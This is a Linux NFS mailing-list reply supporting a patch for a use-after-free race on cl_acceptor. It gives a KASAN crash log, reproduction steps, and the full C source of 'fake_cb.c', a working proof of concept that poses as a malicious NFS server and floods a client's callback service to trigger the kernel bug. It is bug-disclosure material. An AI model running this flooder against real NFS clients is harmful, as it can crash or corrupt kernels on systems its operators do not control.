Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=74.125.82.176
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1794083473;
	b=25Hq/yFOB6fs2ZCDOTXfWj56mSSpzYfTE9E8AcB7aRVgyOP0I6l89fXkJ8nVn4NRiHUS
	 WShCLa6chfhGxCMZDEZ/2rhTCqNE1KpTLmMZa1tkKUthf+bMqeexb9N82iF4KFanfllvk
	 4bDTrFUlIqpvbmEnbg0qULZnS0urn3zQ4X7ftQ4rWWc684v2xxxCEH/7pg6aZg2mTs569
	 naZk5q6yM8EqsWNtqG/i8X5f+QdZRzkfRGKTorVygen0Tm4GXWZX5YCz/HAHEuMWJ4o9F
	 lD2j7369C+CS8gNmbDKyQRkEzhyEXI++JUeKGYCQakrcccp2yuSj6bNJeMLMsQZoBcw==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1794083473;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
	 Date:Message-Id:X-Mailer:In-Reply-To:References:MIME-Version:
	 Content-Type:Content-Transfer-Encoding;
	bh=2CEoXiU5eJZe+rmFpVasvu76xlLHNYwvdGTeeRKfNUU=;
	b=QA5b4iWehzhD3TinIr93c5+rSoHhOvQXuYrxiqvnDhSdxEC+XdTWrFuMS3LOdE3vPbC3
	 LolHQEuvkOAH9qmkfcTT50mIb/wivTcJntAK/afM53726HQGyzqyjkQQZd1aZ4pKr0KyN
	 8y23ww97sIXIm+krIOCljVxjfl4393USrUUZ2XEbheVbXCq+X+fZBUGcSL4BGfZ8APhGi
	 GDLPzjU+UagDm9L7rALElgHiPDmnDydBiYyMADkJ01dx+MfRqYZkkj/TqdhHaZLxvfVgr
	 SOEXjvi34ZrkjKW8ljgYTd90KqTWMrMtUDlnItjvIwYFCKXzxa0GOtweqDqldxSH1jQ==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=gmail.com;
	spf=pass smtp.mailfrom=gmail.com;
	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=m5clF3Qi;
	arc=none smtp.remote-ip=74.125.82.176
Received: from mail-dy1-f176.google.com (mail-dy1-f176.google.com [74.125.82.176])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 69872606A32D
	for <linux-nfs@vger.kernel.org>; Sat,  7 Nov 2026 20:31:13 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 69872606A32D
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=m5clF3Qi
Received: by mail-dy1-f176.google.com with SMTP id 5a478bee46e88-36dc4797082so3709eec.2
        for <linux-nfs@vger.kernel.org>; Sat, 07 Nov 2026 12:31:13 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20260707; t=1794083472; x=1794688272; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:mime-version:references
         :in-reply-to:message-id:date:subject:cc:to:from:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=2CEoXiU5eJZe+rmFpVasvu76xlLHNYwvdGTeeRKfNUU=;
        b=m5clF3Qit5n/1Zw56ghd09j+EC9LJngmz5/KXJ3vt1Pwd17zLrATM1KAB0W+4bSLn5
         T7TA7iomcZ/DaTg3nXITzwEi8ougPDTuS09zM77Su4q0PrOifQHYFQ8hgowVXQMhWAjb
         W3Voq/bcBtJn7r1Yf5bw4Q47uuaaKwy+e7K8VUCty8zmEnz4ItCs7V14yUeuaqGA54Tf
         ePlTw5AWmY0POChkvlSduEq+44YBi3rN9akAe8kPgRGj+AZiOrBTdjzM+sot3UHfFQyt
         DmJCCJoZBQbIEBwoFqmNA1Bya8r/vNDZfivBRezk/Ysqby2BmGCSt19+mI0TT3SJzPlw
         UuXg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1794083472; x=1794688272;
        h=content-transfer-encoding:content-type:mime-version:references
         :in-reply-to:message-id:date:subject:cc:to:from:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=2CEoXiU5eJZe+rmFpVasvu76xlLHNYwvdGTeeRKfNUU=;
        b=hGby1oidgYF6tWml8cBEiWp7H2989oNqeGXY8kKaH/V6PnllHAHMbTzL6wJW7ARuT1
         Fj3FhsrbAmmA+FbjWTxuoL8RLtY5VoHNYfMsEx7V92HpM2ImStl0BtRyOY9pDp93WAWZ
         RPCjyTKAN2InzEfNfoUdvd1IV0AgFYGIh9wvqUuh1oAXYHD2zVFjd/XckRG6zps/6Yv7
         wybyRgKrjO5iwxPlqYQ9dVCbAcWD6FV0oX3teVxLSUW74/99MqR5TH6lij2YlaaN1K5u
         degmXMxmXi7H1BMQLujUeCx5Dclq38oln1Em3UR0KH1yGeKzxq2aAldfoZqVvyrRgyhK
         JZPg==
X-Gm-Message-State: APuU4Z+tmUsxX2emqX9wkKyO+t3IJ83rXWtRmFz+5KkhwHsNQguyaCzU
	lDV9u1HMGln4lVKHwSs0dj9E9gRZrhkH2El3/SRLKKYsu0ejHDt1w7g1lugbnnZx
X-Gm-Gg: AYBFou3+c6D8aIEgsuyTs7N7iAxlkzt0/W+ePC8upo6joVYNW2nmssn3S64bSWYalQl
	QwgE0tYeavvTmpi3UrNdcuWUkD/pxkFgmbu+Wlj7xKtZMPUl1E673d6Fot1gCYlx47W9IPFLTt1
	96qrBAjB+ID0KEdZnYMLZRpflkMrjKgee1mKYz6jbLt3HPYyh9fsYbQ6/7rU7xcTcslYaZiqCAb
	seHIpiiiboRWrqsopacxN7yRTsGyQWnowZvSx9ydpxY8qqQ8ar0H4eCHCyFEAvUEt3wffus37e8
	Q/px1pboFCPbmTvA5c81kYPFA3Cd8Oe479dOhJPZQsP6P+9RTyGpe6HHiPJCRuSKhliob8pnuI5
	F5kxgvSU8taWdOuPL8k9Tgt9qXY3cKhMUYpOdrUwxzBzWXAsEGgx1UfgTNPvhh716IvKK8g9w61
	Sl49wwe5jUyYqc1peaaLnOXsxk/6UrZfDnKUE20Dk8/cDXjCOkrVPN17CEDtXGg4jwLJCMLG1CH
	PJPqCQ8vC8E7eDZ032X/eCkEaJW3WHEi4oktO2cy3sOatSjAYTjsEiGYuFYaxaH8AViuH6BkbKu
	xUP3/n/j6AqTWRa5XUxUu6lyHfAukKYCpqk0bYH1Hg==
X-Received: by 2002:a05:693c:8956:10b0:36a:143d:98db with SMTP id 5a478bee46e88-37255c4f018mr349287eec.1.1794083472118;
        Sat, 07 Nov 2026 12:31:12 -0800 (PST)
Received: from localhost.localdomain ([142.249.36.161])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-372665db8bbsm67421eec.22.2026.11.07.12.31.09
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 07 Nov 2026 12:31:11 -0800 (PST)
From: Chengyu Liu <lui2012qwq@gmail.com>
To: linux-nfs@vger.kernel.org
Cc: trondmy@kernel.org,
	anna@kernel.org,
	cel@kernel.org,
	stable@vger.kernel.org,
	Chengyu Liu <lui2012qwq@gmail.com>
Subject: Re: [PATCH] nfs: fix cl_acceptor replacement racing the callback reader
Date: Sun,  8 Nov 2026 04:29:40 +0800
Message-Id: <20261107202940.58385-1-lui2012qwq@gmail.com>
X-Mailer: git-send-email 2.25.1
In-Reply-To: <20261107201926.56191-1-lui2012qwq@gmail.com>
References: <20261107201926.56191-1-lui2012qwq@gmail.com>
X-Mailing-List: linux-nfs@vger.kernel.org
List-Id: <linux-nfs.vger.kernel.org>
List-Post: <mailto:linux-nfs@vger.kernel.org>
List-Help: <mailto:linux-nfs+help@vger.kernel.org>
List-Subscribe: <mailto:linux-nfs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-nfs+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-nfs+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

Full dmesg and the reproducer :

==================================================================
[  376.107410] BUG: KASAN: slab-use-after-free in check_gss_callback_principal+0x1bd/0x350
[  376.107426] Read of size 1 at addr ffff888005b46520 by task NFSv4 callback/361

[  376.107429] CPU: 3 UID: 0 PID: 361 Comm: NFSv4 callback Not tainted 7.3.0-rc7-00036-gf9532d351e12-dirty #28 PREEMPT(lazy) 
[  376.107432] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[  376.107434] Call Trace:
[  376.107436]  <TASK>
[  376.107437]  dump_stack_lvl+0x55/0x70
[  376.107467]  print_report+0x10d/0x5d0
[  376.107470]  ? check_gss_callback_principal+0x1bd/0x350
[  376.107471] f032: setclientid swap #10 old=ffff888005b46520 new=ffff8880516d4f20
[  376.107472]  kasan_report+0x96/0xd0
[  376.107474]  ? check_gss_callback_principal+0x1bd/0x350
[  376.107476]  kasan_check_range+0xf6/0x1b0
[  376.107478]  check_gss_callback_principal+0x1bd/0x350
[  376.107480]  nfs4_callback_compound+0x2a8/0x1170
[  376.107482]  ? __pfx_nfs4_callback_compound+0x10/0x10
[  376.107484]  ? __pfx_rsc_put+0x10/0x10
[  376.107487]  ? svcauth_gss_accept+0x75e/0x1780
[  376.107489]  ? __pfx_nfs4_callback_compound+0x10/0x10
[  376.107491]  nfs_callback_dispatch+0x88/0x100
[  376.107492]  svc_process_common+0xefe/0x17d0
[  376.107496]  ? __pfx_svc_process_common+0x10/0x10
[  376.107498]  ? __pfx_nfs_callback_dispatch+0x10/0x10
[  376.107500]  svc_process+0x5cf/0xb00
[  376.107503]  ? svc_fill_pages+0x12a/0x370
[  376.107507]  ? kvm_clock_read+0x15/0x30
[  376.107510]  ? ktime_get+0xe6/0x150
[  376.107512]  svc_recv+0x15a4/0x1f80
[  376.107515]  ? __pfx_svc_recv+0x10/0x10
[  376.107516]  ? nfs4_callback_svc+0xde/0x150
[  376.107518]  nfs4_callback_svc+0xc0/0x150
[  376.107520]  ? __pfx_nfs4_callback_svc+0x10/0x10
[  376.107521]  kthread+0x350/0x450
[  376.107524]  ? __pfx_kthread+0x10/0x10
[  376.107525]  ret_from_fork+0x3ad/0x630
[  376.107527]  ? __pfx_ret_from_fork+0x10/0x10
[  376.107529]  ? __pfx_kthread+0x10/0x10
[  376.107530]  ? __switch_to+0x58a/0xdd0
[  376.107534]  ? __pfx_kthread+0x10/0x10
[  376.107535]  ret_from_fork_asm+0x1a/0x30
[  376.107544]  </TASK>

[  376.107546] Allocated by task 97320:
[  376.107548]  kasan_save_stack+0x24/0x50
[  376.107549]  kasan_save_track+0x14/0x30
[  376.107551]  __kasan_kmalloc+0x7f/0x90
[  376.107552]  __kmalloc_noprof+0x1d6/0x4b0
[  376.107554]  gss_stringify_acceptor+0xe3/0x250
[  376.107556]  nfs4_proc_setclientid+0x2cb/0x840
[  376.107559]  nfs4_init_clientid+0x23d/0x450
[  376.107561]  nfs4_establish_lease+0x14e/0x1b0
[  376.107562]  nfs4_run_state_manager+0x23e/0x1b50
[  376.107564]  kthread+0x350/0x450
[  376.107565]  ret_from_fork+0x3ad/0x630
[  376.107567]  ret_from_fork_asm+0x1a/0x30

[  376.107569] Freed by task 131044:
[  376.107570]  kasan_save_stack+0x24/0x50
[  376.107572]  kasan_save_track+0x14/0x30
[  376.107573]  kasan_save_free_info+0x3a/0x60
[  376.107575]  __kasan_slab_free+0x43/0x70
[  376.107576]  kfree+0x18e/0x3c0
[  376.107578]  nfs4_proc_setclientid+0x2b4/0x840
[  376.107580]  nfs4_init_clientid+0x23d/0x450
[  376.107581]  nfs4_establish_lease+0x14e/0x1b0
[  376.107583]  nfs4_run_state_manager+0x23e/0x1b50
[  376.107584]  kthread+0x350/0x450
[  376.107585]  ret_from_fork+0x3ad/0x630
[  376.107587]  ret_from_fork_asm+0x1a/0x30

[  376.107589] The buggy address belongs to the object at ffff888005b46520
                which belongs to the cache kmalloc-16 of size 16
[  376.107591] The buggy address is located 0 bytes inside of
                freed 16-byte region [ffff888005b46520, ffff888005b46530)

[  376.107593] The buggy address belongs to the physical page:
[  376.107594] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x5b46
[  376.107596] flags: 0x100000000000000(node=0|zone=1)
[  376.107598] page_type: f5(slab)
[  376.107602] raw: 0100000000000000 ffff888001042640 dead000000000100 dead000000000122
[  376.107604] raw: 0000000000000000 0000000000800080 00000000f5000000 0000000000000000
[  376.107605] page dumped because: kasan: bad access detected

[  376.107606] Memory state around the buggy address:
[  376.107607]  ffff888005b46400: 00 01 fc fc 00 06 fc fc 00 06 fc fc 00 01 fc fc
[  376.107608]  ffff888005b46480: 00 01 fc fc 00 01 fc fc 00 01 fc fc 00 06 fc fc
[  376.107609] >ffff888005b46500: 00 01 fc fc fa fb fc fc 00 06 fc fc 00 06 fc fc
[  376.107610]                                ^
[  376.107611]  ffff888005b46580: 00 06 fc fc 00 01 fc fc 00 06 fc fc 00 01 fc fc
[  376.107612]  ffff888005b46600: 00 01 fc fc 00 06 fc fc 00 01 fc fc 00 01 fc fc
[  376.107613] ==================================================================


Reproducer

Environment: one QEMU guest runs the KDC, knfsd and the test client
(sec=krb5, vers=4.0, all over loopback).  A userspace program plays the
malicious server: it connects to the client backchannel (program
0x40000000, port found via rpcbind), establishes an RPCSEC_GSS context
as the server principal with service=none, and floods
CB_COMPOUND(minorversion=0, cb_ident, nops=0) - every such call makes
the client's callback thread run check_gss_callback_principal().  The
forechannel is then partitioned (iptables DROP dport 2049) past the
server lease time, which forces NFS4ERR_STALE_CLIENTID -> lease reclaim
-> nfs4_proc_setclientid() re-run, opening the dangling window while
the flood keeps running (the backchannel is not affected by the
forechannel partition).

Witness instrumentation on the PoC kernel (NOT the fix, only makes the
race observable): in check_gss_callback_principal() a kasan_check_read()
marks the read of clp->cl_acceptor (lib/string.o is built without KASAN
instrumentation, so the strcmp() itself is invisible to KASAN and would
not report on its own) and a counter logs every 64th check; in
nfs4_proc_setclientid() a udelay(3000) between the kfree() and the
re-assignment widens the window, and a printk logs each swap with its
old/new pointer values (the "f032: setclientid swap #10 old=... new=..."
line interleaved in the splat above; note the old= value matches the
KASAN buggy address exactly).  The allocation and free sites remain
unmodified.

The malicious-server flooder, fake_cb.c (build: gcc -O2 -o fake_cb
fake_cb.c -lgssapi_krb5; needs the nfs/localhost keytab TGT in the
default ccache; run: ./fake_cb ::1 <callback-port> <cb_ident>):

/*
 * fake_cb.c - F-032 PoC: malicious NFSv4.0 server callback flooder.
 *
 * Connects to the client kernel's NFSv4 callback service (program
 * 0x40000000, discovered via rpcbind) over TCP, establishes one
 * RPCSEC_GSS context as nfs/localhost@POC.LOCAL (service=none), then
 * floods minimal CB_COMPOUND(minorversion=0, cb_ident, nops=0) calls.
 *
 * Every such call makes the client's backchannel svc thread run
 * check_gss_callback_principal(), which locklessly reads
 * clp->cl_acceptor - racing nfs4_proc_setclientid()'s kfree+reassign
 * of the same field during lease recovery.
 *
 * usage: fake_cb <host> <port> <cb_ident>
 * Needs a Kerberos TGT for nfs/localhost@POC.LOCAL in the default
 * ccache (kinit -k -t /etc/krb5.keytab nfs/localhost@POC.LOCAL).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <poll.h>
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <gssapi/gssapi.h>

#define PROG_NFS4_CB	0x40000000u
#define VERS_CB		1u
#define PROC_NULL	0u
#define PROC_CB_COMPOUND 1u

#define FLAVOR_AUTH_NULL 0u
#define FLAVOR_RPCSEC_GSS 6u

#define RPC_GSS_VERSION	1u
#define GSS_PROC_DATA	0u
#define GSS_PROC_INIT	1u
#define GSS_SVC_NONE	1u

#define REPLY		1u
#define MSG_ACCEPTED	0u
#define MSG_DENIED	1u
#define AUTH_ERROR	7u

static uint32_t xid_counter = 0x66000000;

static void put32(uint8_t **p, uint32_t v)
{
	*(uint32_t *)*p = htonl(v);
	*p += 4;
}

static void put_opaque(uint8_t **p, const void *data, uint32_t len)
{
	uint32_t pad = (4 - (len & 3)) & 3;

	put32(p, len);
	memcpy(*p, data, len);
	*p += len;
	memset(*p, 0, pad);
	*p += pad;
}

static int get32(uint8_t **p, uint8_t *end, uint32_t *v)
{
	if (*p + 4 > end)
		return -1;
	*v = ntohl(*(uint32_t *)*p);
	*p += 4;
	return 0;
}

static int skip_opaque_auth(uint8_t **p, uint8_t *end, uint32_t *flavor)
{
	uint32_t len, pad;

	if (get32(p, end, flavor) || get32(p, end, &len))
		return -1;
	pad = (4 - (len & 3)) & 3;
	if (*p + len + pad > end)
		return -1;
	*p += len + pad;
	return 0;
}

static int read_full(int fd, void *buf, size_t len)
{
	uint8_t *p = buf;

	while (len) {
		ssize_t n = read(fd, p, len);
		if (n <= 0)
			return -1;
		p += n;
		len -= n;
	}
	return 0;
}

/* Receive one TCP record-marked fragment. Returns payload length or -1. */
static int recv_record(int fd, uint8_t *buf, size_t cap, int timeout_ms)
{
	struct pollfd pfd = { .fd = fd, .events = POLLIN };
	uint32_t marker;
	int pr = poll(&pfd, 1, timeout_ms);

	if (pr <= 0)
		return -1;
	if (read_full(fd, &marker, 4))
		return -1;
	marker = ntohl(marker);
	if (!(marker & 0x80000000u) || (marker & 0x7fffffff) > cap)
		return -1;
	if (read_full(fd, buf, marker & 0x7fffffff))
		return -1;
	return marker & 0x7fffffff;
}

static int send_record(int fd, const uint8_t *buf, size_t len)
{
	uint32_t marker = htonl(0x80000000u | len);

	if (write(fd, &marker, 4) != 4)
		return -1;
	return write(fd, buf, len) == (ssize_t)len ? 0 : -1;
}

static int tcp_connect(const char *host, const char *port)
{
	struct addrinfo hints = { .ai_socktype = SOCK_STREAM,
				  .ai_family = AF_UNSPEC }, *ai, *a;
	int fd = -1;

	if (getaddrinfo(host, port, &hints, &ai))
		return -1;
	for (a = ai; a; a = a->ai_next) {
		fd = socket(a->ai_family, a->ai_socktype, a->ai_protocol);
		if (fd < 0)
			continue;
		if (connect(fd, a->ai_addr, a->ai_addrlen) == 0)
			break;
		close(fd);
		fd = -1;
	}
	freeaddrinfo(ai);
	if (fd >= 0) {
		int one = 1;
		setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
	}
	return fd;
}

/*
 * Build a call header: xid .. end of credential (the MIC input for
 * DATA calls is exactly this range, per svcauth_gss_verify_header()).
 * Returns header length.
 */
static size_t build_header(uint8_t *buf, uint32_t proc, uint32_t gss_proc,
			   uint32_t seq, const uint8_t *ctx_handle,
			   uint32_t ctx_len)
{
	uint8_t *p = buf;
	uint8_t *len_slot;
	uint32_t cred_body_len;

	put32(&p, xid_counter++);
	put32(&p, 0);			/* CALL */
	put32(&p, 2);			/* rpcvers */
	put32(&p, PROG_NFS4_CB);
	put32(&p, VERS_CB);
	put32(&p, proc);
	put32(&p, FLAVOR_RPCSEC_GSS);
	len_slot = p;
	p += 4;				/* cred length, patched below */
	put32(&p, RPC_GSS_VERSION);
	put32(&p, gss_proc);
	put32(&p, seq);
	put32(&p, GSS_SVC_NONE);
	put_opaque(&p, ctx_handle, ctx_len);
	cred_body_len = p - (len_slot + 4);
	*(uint32_t *)len_slot = htonl(cred_body_len);
	return p - buf;
}

/*
 * GSS context + RPCSEC_GSS_INIT handshake: mint a single-leg krb5 token
 * and send it to proc 0, then read back the context handle.
 */
static int gss_handshake(int fd, gss_ctx_id_t *ctxp, uint8_t *handle,
			 uint32_t *handle_len)
{
	gss_buffer_desc name_buf = { .value = "nfs@localhost",
				     .length = strlen("nfs@localhost") };
	gss_name_t target;
	gss_buffer_desc out_token = GSS_C_EMPTY_BUFFER;
	OM_uint32 major, minor;
	uint8_t msg[8192], rep[8192], *p, *end;
	size_t hlen;
	uint32_t v, flavor, major_st;
	int rlen;

	major = gss_import_name(&minor, &name_buf, GSS_C_NT_HOSTBASED_SERVICE,
				&target);
	if (major != GSS_S_COMPLETE) {
		fprintf(stderr, "hs: import_name: %u/%u\n", major, minor);
		return -1;
	}
	/* No mutual auth flag: krb5 completes in a single leg. */
	major = gss_init_sec_context(&minor, GSS_C_NO_CREDENTIAL, ctxp,
				     target, GSS_C_NO_OID, 0, 0,
				     GSS_C_NO_CHANNEL_BINDINGS,
				     GSS_C_NO_BUFFER, NULL, &out_token,
				     NULL, NULL);
	gss_release_name(&minor, &target);
	if (major != GSS_S_COMPLETE || out_token.length == 0) {
		fprintf(stderr, "init_sec_context: %u/%u\n", major, minor);
		return -1;
	}

	hlen = build_header(msg, PROC_NULL, GSS_PROC_INIT, 1, NULL, 0);
	p = msg + hlen;
	put32(&p, FLAVOR_AUTH_NULL);
	put32(&p, 0);			/* empty verifier */
	put_opaque(&p, out_token.value, out_token.length);
	gss_release_buffer(&minor, &out_token);

	if (send_record(fd, msg, p - msg)) {
		fprintf(stderr, "hs: send_record failed\n");
		return -1;
	}
	fprintf(stderr, "hs: INIT sent (%zu bytes), waiting reply\n", p - msg);
	rlen = recv_record(fd, rep, sizeof(rep), 5000);
	if (rlen < 0) {
		fprintf(stderr, "hs: reply timeout/error\n");
		return -1;
	}
	fprintf(stderr, "hs: reply %d bytes\n", rlen);
	{
		int i;
		for (i = 0; i + 4 <= rlen; i += 4)
			fprintf(stderr, "  [%02d] %02x%02x%02x%02x\n", i,
				rep[i], rep[i+1], rep[i+2], rep[i+3]);
	}

	p = rep;
	end = rep + rlen;
	if (get32(&p, end, &v)) {			/* xid */
		fprintf(stderr, "hs: bad xid\n");
		return -1;
	}
	if (get32(&p, end, &v) || v != REPLY) {
		fprintf(stderr, "hs: not a reply: %u\n", v);
		return -1;
	}
	if (get32(&p, end, &v)) {			/* reply_stat */
		fprintf(stderr, "hs: bad reply_stat\n");
		return -1;
	}
	if (v != MSG_ACCEPTED) {
		uint32_t rej, auth_st = 0;

		if (!get32(&p, end, &rej)) {
			if (rej == 2)
				get32(&p, end, &auth_st);
			fprintf(stderr, "INIT denied: reject_stat=%u auth_stat=%u\n",
				rej, auth_st);
		}
		return -1;
	}
	if (skip_opaque_auth(&p, end, &flavor)) {
		fprintf(stderr, "hs: bad reply verf\n");
		return -1;
	}
	if (get32(&p, end, &v) || v != 0) {	/* accept_stat SUCCESS */
		fprintf(stderr, "INIT accept_stat: %u\n", v);
		return -1;
	}
	/* rpc_gss_init_res: opaque handle<> */
	if (get32(&p, end, handle_len) || *handle_len > 128 ||
	    p + *handle_len > end) {
		fprintf(stderr, "hs: bad handle\n");
		return -1;
	}
	memcpy(handle, p, *handle_len);
	p += (*handle_len + 3) & ~3u;
	if (get32(&p, end, &major_st))
		return -1;
	if (major_st != 0) {
		fprintf(stderr, "INIT gss major: %u\n", major_st);
		return -1;
	}
	return 0;
}

/* Queue one flooded CB_COMPOUND without waiting for the reply. */
static int queue_one(int fd, gss_ctx_id_t gss_ctx, const uint8_t *handle,
		     uint32_t handle_len, uint32_t seq, uint32_t cb_ident)
{
	uint8_t msg[8192], *p;
	gss_buffer_desc hdr_buf, mic = GSS_C_EMPTY_BUFFER;
	OM_uint32 major, minor;
	size_t hlen;

	hlen = build_header(msg, PROC_CB_COMPOUND, GSS_PROC_DATA, seq,
			    handle, handle_len);

	/* verifier = MIC over [xid .. end of credential] */
	hdr_buf.value = msg;
	hdr_buf.length = hlen;
	major = gss_get_mic(&minor, gss_ctx, GSS_C_QOP_DEFAULT, &hdr_buf, &mic);
	if (major != GSS_S_COMPLETE)
		return -1;

	p = msg + hlen;
	put32(&p, FLAVOR_RPCSEC_GSS);
	put_opaque(&p, mic.value, mic.length);
	gss_release_buffer(&minor, &mic);

	/* CB_COMPOUND args: tag, minorversion=0, cb_ident, nops=0 */
	put_opaque(&p, "poc", 3);
	put32(&p, 0);
	put32(&p, cb_ident);
	put32(&p, 0);

	return send_record(fd, msg, p - msg);
}

static int drain_reply(int fd)
{
	uint8_t rep[8192];

	return recv_record(fd, rep, sizeof(rep), 2000);
}

int main(int argc, char **argv)
{
	const char *host, *port;
	uint32_t cb_ident, handle_len, seq;
	uint8_t handle[128];
	uint64_t sent = 0;
	int fd;

	if (argc != 4) {
		fprintf(stderr, "usage: %s <host> <port> <cb_ident>\n", argv[0]);
		return 2;
	}
	host = argv[1];
	port = argv[2];
	cb_ident = strtoul(argv[3], NULL, 0);

	for (;;) {
		gss_ctx_id_t gss_ctx = GSS_C_NO_CONTEXT;

		fd = tcp_connect(host, port);
		if (fd < 0) {
			perror("connect");
			sleep(1);
			continue;
		}
		if (gss_handshake(fd, &gss_ctx, handle, &handle_len)) {
			fprintf(stderr, "handshake failed\n");
			close(fd);
			sleep(1);
			continue;
		}
		fprintf(stderr, "fake_cb: context up, flooding cb_ident=%u\n",
			cb_ident);

#define BURST 64

		for (seq = 1; ; sent++) {
			int b;

			for (b = 0; b < BURST; b++, seq++)
				if (queue_one(fd, gss_ctx, handle, handle_len,
					      seq, cb_ident))
					goto broke;
			for (b = 0; b < BURST; b++)
				if (drain_reply(fd))
					goto broke;
			if (sent && !(sent % 20000))
				fprintf(stderr, "fake_cb: %lu calls sent\n",
					sent);
			continue;
		broke:
			fprintf(stderr, "fake_cb: conn broke after %lu "
				"calls, reconnecting\n", sent);
			break;
		}
		close(fd);
		OM_uint32 minor;
		gss_delete_sec_context(&minor, &gss_ctx, NULL);
	}
}
